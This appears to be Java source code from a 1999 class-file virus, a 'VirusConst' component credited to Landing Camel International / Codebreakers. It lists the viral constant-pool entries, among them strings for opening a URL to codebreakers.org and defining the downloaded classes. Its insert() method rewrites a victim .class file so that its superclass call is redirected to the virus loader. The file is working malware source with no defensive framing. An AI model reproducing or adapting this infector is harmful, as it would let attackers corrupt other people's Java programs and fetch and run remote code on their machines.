//=============================================================
//
// Title:  VirusConst.java
// Author: Landing Camel International
// Date:   January 1999
//
// Notes:  This class will insert the viral constants
//
//=============================================================

import java.util.*;
import java.io.*;

public class be93a29f {
	  
   private int virus_cp_count = 95;
   private byte virus_cp[];
   private int old_consts[] = {
		//--> constant_pool[1] CONSTANT_String
			8,
			0,
			61,
		//--> constant_pool[2] CONSTANT_String
			8,
			0,
			63,
		//--> constant_pool[3] CONSTANT_String
			8,
			0,
			77,
		//--> constant_pool[4] CONSTANT_Class
			7,
			0,
			69,
		//--> constant_pool[5] CONSTANT_Class
			7,
			0,
			78,
		//--> constant_pool[6] CONSTANT_Class
			7,
			0,
			79,
		//--> constant_pool[7] CONSTANT_Class
			7,
			0,
			80,
		//--> constant_pool[8] CONSTANT_Class
			7,
			0,
			81,
		//--> constant_pool[9] CONSTANT_Class
			7,
			0,
			82,
		//--> constant_pool[10] CONSTANT_Class
			7,
			0,
			83,
		//--> constant_pool[11] CONSTANT_Class
			7,
			0,
			84,
		//--> constant_pool[12] CONSTANT_Class
			7,
			0,
			85,
		//--> constant_pool[13] CONSTANT_Class
			7,
			0,
			86,
		//--> constant_pool[14] CONSTANT_Class
			7,
			0,
			87,
		//--> constant_pool[15] CONSTANT_Methodref
			10,
			0,
			7,
			0,
			33,
		//--> constant_pool[16] CONSTANT_Methodref
			10,
			0,
			8,
			0,
			33,
		//--> constant_pool[17] CONSTANT_Methodref
			10,
			0,
			9,
			0,
			33,
		//--> constant_pool[18] CONSTANT_Methodref
			10,
			0,
			12,
			0,
			34,
		//--> constant_pool[19] CONSTANT_Methodref
			10,
			0,
			13,
			0,
			34,
		//--> constant_pool[20] CONSTANT_Methodref
			10,
			0,
			12,
			0,
			35,
		//--> constant_pool[21] CONSTANT_Methodref
			10,
			0,
			5,
			0,
			36,
		//--> constant_pool[22] CONSTANT_Methodref
			10,
			0,
			8,
			0,
			37,
		//--> constant_pool[23] CONSTANT_Methodref
			10,
			0,
			8,
			0,
			38,
		//--> constant_pool[24] CONSTANT_Methodref
			10,
			0,
			14,
			0,
			39,
		//--> constant_pool[25] CONSTANT_Methodref
			10,
			0,
			14,
			0,
			40,
		//--> constant_pool[26] CONSTANT_Methodref
			10,
			0,
			8,
			0,
			41,
		//--> constant_pool[27] CONSTANT_Methodref
			10,
			0,
			6,
			0,
			42,
		//--> constant_pool[28] CONSTANT_Methodref
			10,
			0,
			13,
			0,
			43,
		//--> constant_pool[29] CONSTANT_Methodref
			10,
			0,
			5,
			0,
			44,
		//--> constant_pool[30] CONSTANT_Methodref
			10,
			0,
			8,
			0,
			45,
		//--> constant_pool[31] CONSTANT_InterfaceMethodref
			11,
			0,
			11,
			0,
			46,
		//--> constant_pool[32] CONSTANT_Methodref
			10,
			0,
			12,
			0,
			47,
		//--> constant_pool[33] CONSTANT_NameAndType
			12,
			0,
			62,
			0,
			53,
		//--> constant_pool[34] CONSTANT_NameAndType
			12,
			0,
			62,
			0,
			57,
		//--> constant_pool[35] CONSTANT_NameAndType
			12,
			0,
			71,
			0,
			56,
		//--> constant_pool[36] CONSTANT_NameAndType
			12,
			0,
			72,
			0,
			53,
		//--> constant_pool[37] CONSTANT_NameAndType
			12,
			0,
			73,
			0,
			59,
		//--> constant_pool[38] CONSTANT_NameAndType
			12,
			0,
			74,
			0,
			55,
		//--> constant_pool[39] CONSTANT_NameAndType
			12,
			0,
			75,
			0,
			48,
		//--> constant_pool[40] CONSTANT_NameAndType
			12,
			0,
			76,
			0,
			49,
		//--> constant_pool[41] CONSTANT_NameAndType
			12,
			0,
			88,
			0,
			55,
		//--> constant_pool[42] CONSTANT_NameAndType
			12,
			0,
			89,
			0,
			50,
		//--> constant_pool[43] CONSTANT_NameAndType
			12,
			0,
			90,
			0,
			52,
		//--> constant_pool[44] CONSTANT_NameAndType
			12,
			0,
			91,
			0,
			60,
		//--> constant_pool[45] CONSTANT_NameAndType
			12,
			0,
			92,
			0,
			54,
		//--> constant_pool[46] CONSTANT_NameAndType
			12,
			0,
			93,
			0,
			53,
		//--> constant_pool[47] CONSTANT_NameAndType
			12,
			0,
			94,
			0,
			51,
		};

   private String[] virus_cp_strings = {	
		//--> constant_pool[48] CONSTANT_Utf8
			"()I",
		//--> constant_pool[49] CONSTANT_Utf8
			"()Ljava/io/InputStream;",

		//--> constant_pool[50] CONSTANT_Utf8
			"()Ljava/lang/Object;",

		//--> constant_pool[51] CONSTANT_Utf8
			"()Ljava/lang/String;",

		//--> constant_pool[52] CONSTANT_Utf8
			"()Ljava/net/URLConnection;",

		//--> constant_pool[53] CONSTANT_Utf8
			"()V",

		//--> constant_pool[54] CONSTANT_Utf8
			"(Ljava/lang/Class;)V",

		//--> constant_pool[55] CONSTANT_Utf8
			"(Ljava/lang/String;)Ljava/lang/Class;",

		//--> constant_pool[56] CONSTANT_Utf8
			"(Ljava/lang/String;)Ljava/lang/StringBuffer;",

		//--> constant_pool[57] CONSTANT_Utf8
			"(Ljava/lang/String;)V",

		//--> constant_pool[58] CONSTANT_Utf8
			"(Ljava/lang/String;Z)Ljava/lang/Class;",
			
		//--> constant_pool[59] CONSTANT_Utf8
			"(Ljava/lang/String;[BII)Ljava/lang/Class;",
					
		//--> constant_pool[60] CONSTANT_Utf8
			"([B)I",

		//--> constant_pool[61] CONSTANT_Utf8
			".class",

		//--> constant_pool[62] CONSTANT_Utf8
			"<init>",

		//--> constant_pool[63] CONSTANT_Utf8
			"BeanHive",

		//--> constant_pool[64] CONSTANT_Utf8
			"Code",

		//--> constant_pool[65] CONSTANT_Utf8
			"ConstantValue",

		//--> constant_pool[66] CONSTANT_Utf8
			"Exceptions",

		//--> constant_pool[67] CONSTANT_Utf8
			"LocalVariables",

		//--> constant_pool[68] CONSTANT_Utf8
			"SourceFile",

		//--> constant_pool[69] CONSTANT_Utf8
			"Virus",
		
		//--> constant_pool[70] CONSTANT_Utf8
			"BeanHive.java",

		//--> constant_pool[71] CONSTANT_Utf8
			"append",

		//--> constant_pool[72] CONSTANT_Utf8
			"close",

		//--> constant_pool[73] CONSTANT_Utf8
			"defineClass",

		//--> constant_pool[74] CONSTANT_Utf8
			"findSystemClass",

		//--> constant_pool[75] CONSTANT_Utf8
			"getContentLength",

		//--> constant_pool[76] CONSTANT_Utf8
			"getInputStream",

		//--> constant_pool[77] CONSTANT_Utf8
			"http://www.codebreakers.org/",

		//--> constant_pool[78] CONSTANT_Utf8
			"java/io/InputStream",

		//--> constant_pool[79] CONSTANT_Utf8
			"java/lang/Class",
	
		//--> constant_pool[80] CONSTANT_Utf8
			"java/lang/ClassFormatError",

		//--> constant_pool[81] CONSTANT_Utf8
			"java/lang/ClassLoader",

		//--> constant_pool[82] CONSTANT_Utf8
			"java/lang/ClassNotFoundException",

		//--> constant_pool[83] CONSTANT_Utf8
			"java/lang/Exception",

		//--> constant_pool[84] CONSTANT_Utf8
			"java/lang/Runnable",

		//--> constant_pool[85] CONSTANT_Utf8
			"java/lang/StringBuffer",

		//--> constant_pool[86] CONSTANT_Utf8
			"java/net/URL",

		//--> constant_pool[87] CONSTANT_Utf8
			"java/net/URLConnection",

		//--> constant_pool[88] CONSTANT_Utf8
			"loadClass",

		//--> constant_pool[89] CONSTANT_Utf8
			"newInstance",

		//--> constant_pool[90] CONSTANT_Utf8
			"openConnection",

		//--> constant_pool[91] CONSTANT_Utf8
			"read",

		//--> constant_pool[92] CONSTANT_Utf8
			"resolveClass",

		//--> constant_pool[93] CONSTANT_Utf8
			"run",

		//--> constant_pool[94] CONSTANT_Utf8
			"toString",
			
		//--> constant_pool[95] CONSTANT_Utf8
			"Landing Camel International (c) 1999 [Codebreakers]",			

		};

   //----------------------------------------------------------
   void insert(int temp_cp_count, int temp_cp_pointer, 
               int delta_offset, int temp_this_class, 
               int temp_super_class,
               RandomAccessFile temp, a98b34f2 ptr) 
               throws IOException {

      byte temp_tail[];
      int temp_offset;


      //change the constant into an array of bytes
      virus_cp = new byte[old_consts.length];
      for (int i=0; i < old_consts.length; i++) {
      	 virus_cp[i] = (byte)old_consts[i];
      }
      
      //write temp_cp_count
      ptr.seek(8);
      temp.writeShort(temp_cp_count + virus_cp_count);

      //seek to temp_cp_pointer
      ptr.seek(temp_cp_pointer + 4);
      
      temp.writeShort(8 + delta_offset);
      
      ptr.seek(temp_cp_pointer);

      //save the end of file
      temp_offset = (int)temp.length() - ptr.fpointer;
      temp_tail = new byte[temp_offset];
      temp.read(temp_tail, 0, temp_offset);

      //write virus_cp
      ptr.seek();
      
      temp.write(virus_cp);
      
      for (int i=0; i < virus_cp_strings.length; i++) {
      	temp.writeByte(0x01);
      	temp.writeUTF(virus_cp_strings[i]);
      }

      //restore the end of file
      temp.write(temp_tail);
   
      //iterate through const_pool updating delta_offset
      ptr.seek();
      for (int j = 1; j < virus_cp_count; j++) {      	      	
         int tag = temp.readUnsignedByte();
         int data1, data2;
         ptr.fpointer++;
         int skipper = 0;
         switch (tag) {
            case 7: 
            case 8:  data1 = temp.readUnsignedShort();
                     ptr.seek();
                     temp.writeShort(data1 + delta_offset);
                     ptr.update(2);
                     break;
            case 3:
            case 4:  ptr.update(4);
                     break;
            case 9:
            case 10:
            case 11:
            case 12: 
                     data1 = temp.readUnsignedShort();
                     data2 = temp.readUnsignedShort();
                     ptr.seek();
                     temp.writeShort(data1 + delta_offset);
                     temp.writeShort(data2 + delta_offset);
                     ptr.update(4);
                     break;
            case 5:
            case 6:  ptr.update(8);
      	             j++;
                     break;
            case 1: temp.readUTF();
                    ptr.seek((int)temp.getFilePointer());
                    break;
         } // end switch

      } // end for               
      
      //seek to start of cp and find java/lang/object methodref      
      ptr.seek(10);
      for (int i = 1; i < temp_cp_count; i++) {
         int tag = temp.readUnsignedByte();
         ptr.fpointer++;
         switch (tag) {
            case 7: 
            case 8: ptr.update(2);
                    break;
            case 10: if (temp.readShort() == temp_super_class) {
            	        ptr.seek();
            	        temp.writeShort(8 + delta_offset);
                     }                                        
            case 3:
            case 4:
            case 9:
            case 11:
            case 12: ptr.update(4);
                     break;
            case 5:
            case 6: ptr.update(8);
                    i++;
                    break;
            case 1: temp.readUTF();
                    ptr.seek((int)temp.getFilePointer());
                    break;
         }
      } 
      
   } // end insert()
   //----------------------------------------------------------
   
}
